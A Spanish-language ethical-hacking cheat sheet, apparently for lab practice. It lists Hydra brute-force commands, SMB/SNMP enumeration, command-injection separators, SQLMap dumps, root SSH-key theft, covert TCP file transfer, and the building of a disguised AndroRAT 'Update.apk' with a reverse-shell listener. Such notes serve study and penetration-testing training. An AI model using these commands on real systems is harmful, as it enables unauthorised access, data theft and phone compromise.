# EH-Notes

## Brute Force
### Hydra
#### HTTP Attacks
##### GET Form
`hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://192.168.57.132/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low:F=Username and/or password incorrect'`


`curl 'http://192.168.57.132/vulnerabilities/brute/?username=admin&password=admin&Login=Login#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/vulnerabilities/brute/' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1'`

##### POST Form

`hydra -l admin -P /usr/share/wordlists/john.lst http-post-form://192.168.57.132/login.php:"username=^USER^&password=^PASS^&Login=Login":"Login failed"`

`curl 'http://192.168.57.132/login.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.57.132' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/login.php' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin&password=admin&Login=Login'`

##### SSH 
`hydra -l root -P /home/kali/tools/pass.txt 192.168.57.131 ssh -t 4`

##### FTP
`hydra -t 3 -V -ensr -l root -P /usr/share/wordlists/john.lst 192.168.57.132 ftp`

## Services
### FTP
#### Login

`ftp IP`

`user`

`password`

#### Download files

`get file.txt`

### SNMP

Listar equipos con SNMP

`sudo nmap -sU -p 161 --script=snmp-info 192.168.100.0/24`

Informacion SNMP

`snmp-check IP-SNMP`

Procesos SNMP

`nmap -sU -p 161 --script=snmp-processes IP`

Interfaces SNMP

`nmap -sU -p 161 --script=snmp-interfaces IP`

String validos SNMP con metasploit

`msfdb init`

`msfconsole`

`search snmp`

`use auxiliary/scanner/snmp/snmp_login`

`SET RHOST IP-SNMP`

`run`


### SMB

#### Enumeracion

`nmap -p445 IP`

Enumerar carpetas compartidas

`nmap -p445 --script smb-enum-shares IP`

Enumerar usuarios

`nmap -p445 --script smb-enum-users IP`

`nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password IP`

`nmap -p445 --script smb-enum-users --script-args smbdomain=DOMAIN,smbusername=USER,smbpassword=PASSWORD IP -v`

Enumerar grupos

`nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password IP`

Enumerar niveles de seguridad

`nmap -sC -sV -A -T4 -p445 IP`

Enumerar servicios del dominio o equipo
`nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=password IP`

#### Acceder a traves de interfaz grafica

`smb://IP`

### RDP

#### Explotar servicio de RDP

Confirmar puerto de RDP con mestasploit ya que puede estar usando un puerto diferente

`use auxiliary/scanner/rdp/rdp_scanner`

`set RHOST IP`

`set RPORT PUERTO`

`exploit`

Realizar ataque de fuerza bruta con hydra

`hydra -l asus -P pass.txt rdp://192.168.100.55 -s 3389`

Realizar conexion RDP

`xfreerdp /u:USER /p:PASSWORD /v:IP:PORT`

`xfreerdp /u:USER /p:PASSWORD /v:192.168.100.55:3389`

### NETBIOS

`nmap -sV --script nbstat.nse 192.168.100.55`

## Traffic Sniffing

### Filtros Wireshark

`tcp.flags.sync==1`

Filtrar paquetes http

`http`

Seguimiento de paquetes 

`Seleccionar paquete >> Follow >> TCP Stream`

Extraer archivos

`File >> Export objects >> Service (HTTP,TCP,SMB)`

Buscar Strings

`Ctrl + F`

`Colocar palabra a buscar`

Denegacion de servicio

`Statics >> Conversations >> Pestana IPV4 >> Ordenar por bytes`




## Wordlist
`/usr/share/wordlists/metasploit]`

`/usr/share/wordlists/john.lst`

`/usr/share/wordlists`


## Steganography

### Snow

Cifrar archivo

`Abrir en CMD`

`SNOW.exe -C -m "Esto es para cifrar mensaje" -p "Clave" Archivo.txt Salida.txt`

`Se crea archivo Salida.txt`

Descifrar archivo

`SNOW.exe -C -p "Clave" Salida.txt`


### Openstego

`Ejecutar Openstego`

`Seleccionar descifra mensaje`

`Abrir archivo, en caso de estar cifrado puede usar la URL`

`https://hashes.com/en/decrypt/hash`



### Covert TCP

Maquina que envia

`./covert_tcp -source 10.12.0.15 -dest 10.12.0.4 -source_port 9999 -dest_port 8888 -file secret.txt`

Maquina que recibe

`./covert_tcp -source 10.12.0.15 -source_port 8888 -server -file receive.txt`


## Cryptography / Criptografía

### Hashmyfiles

Calcular hashes

`Abrir la aplicación >> Arrastrar los archivos que quiere calcular a la aplicacion`

### Cryptool

Encrpitar archivos

`Abrir aplicacion >>`

Descifrar archivos

`Abrir aplicacion >> Analysis >> Symmetric (Clasic / Modern) >> Escoger cifrado `

### BcTextEncoder

Encoding Data to Hex Format

Ejecutar aplicacion

`Colocar texto plano >> Encode >> Colocar Password `

Decode

`Colocar texto cifrado >> Decode >> Colocra clave`

### CrytoForge

Encriptar archivos

`Click derecho sobre el archivo >> Encrypt >> Colocar clave y confirmar clave`

Descifrar archivos

`Abrir archivo cifrado >> colocar clave`

Descifrar hashes

`https://hashes.com/en/decrypt/hash`

### VeraCrypt

`Abrir aplicacion >> Create Volume >> `

## Hacking web

### Command Injection

Bypass / Concatenar

`;`

`|`

`&&`


### SQLMap

Obtener con Burpsuite el archivo del request

`Click sobre la peticion >> Save Item >> Guardar archivo.txt`

Enumerar bases de datos

`sqlmap -r req.txt --dbs`

`sqlmap -r req.txt -D dvwa`

Enumerar tablas

`sqlmap -r req.txt -D dvwa --tables`

Enumerar columnas

`sqlmap -r req.txt -D dvwa --tables --columns`

Dump de datos

`sqlmap -r req.txt -D dvwa --dump`


### WPS Scan

Enumerar usuarios

`wpscan --url http://url.com/ --enumerate u`

### ADB

Listar celulares conectados por cable
`adb devices`

Conectar al celular

`adb connect IP:PORT`

`adb connect 192.168.0.100:5555`

Ejecutar shell

`adb shell`

Comandos

`ls`

`whoami`

`cd /sdcard`

## Escalación de privilegios

### Linux

#### Metodo 1 - Horizontal privilege scalation

Validar permisos de usuarios
`sudo -l`

Respuesta
`user2 /bin/bash`

Elevar privilegios

`sudo -u user2 /bin/bash`

`whoami`

Respuesta

`user2`



#### Metodo 2 - RSA KEYS

`cd /root`

Respuesta

Permission denied

`ls -la`

`cd /root`

`ls -la`

`cd .ssh`

Respuesta 

`id_rsa`

`cat id_rsa`

copiar informacion 

crear un nuevo archivo con la informacion del rsa

`chmod 600 id_rsa`

establecer una nueva conexion

`ssh root@IP -i id_rsa`

`ssh root@IP -p 5007 -i id_rsa`

whoami


#### Metodo 2 - Autorized keys

`cd /root`

`cd .ssh/`

`cat autorized_keys`

Respuesta

Permission denied

## Escalación de privilegios avanzado

### Escalación vertical

`ls`

`ls -l`

`stat -c "%a %A %U %G %F" opt`

`stat -c "%a %A %U %G %F" folder_name`

`groups name_group`

`strings name_string`

`cp /bin/bash name_string`

Respuesta

Permission denied

`cp /bin/bash name_string`

`ls`

`./name_string`

`whoami`


### Metodo en archivos de sitios web

`cd /var/www/html`

`grep -nr "db_user"`

### Lin enum

`https://github.com/rebootuser/LinEnum`

`https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS`

Descargar con git clone

Asignar permisos de ejecución al script

`chmod +x LinEnum.sh`

Ejecutar 

`./LinEnum.sh`


Ejecutar 

`./linpeas.sh`


## RAT


### NJrat

### MoSucker

### ProRat

Crear conexion

Establecer IP y contraseña

Search files 

File Manager >> download


### PhoneSploit

`python3 phonesploit.py`

Colocar IP

`Opción 4`

`pwd`

`ls`

`cd sdcard`

`ls`


Listar aplicaciones

Salir del menu

`exit`

`seleccionar opción 14`

`seleccionar opción 15`

escribir nombre de la aplicación

`com.android.calculator2`


Descargar archivos

salir al menu principal

`seleccionar opción 9`

colocar directorio o archivo a descargar

`/sdcard/Downloads/images.jpeg`



## AndroRAT

Crear archivo ejecutable

`python3 androRAT.py --build -i IP_Atacante -p 4444 -o Update.apk`


Crear un servidor http para descargar el archivo

`python3 HTTP on 0.0.0.0 port 8888`


Crear servicio de escucha para capturar la sesion

`python3 androRAT.py --shell -i 0.0.0.0 -p 4444`



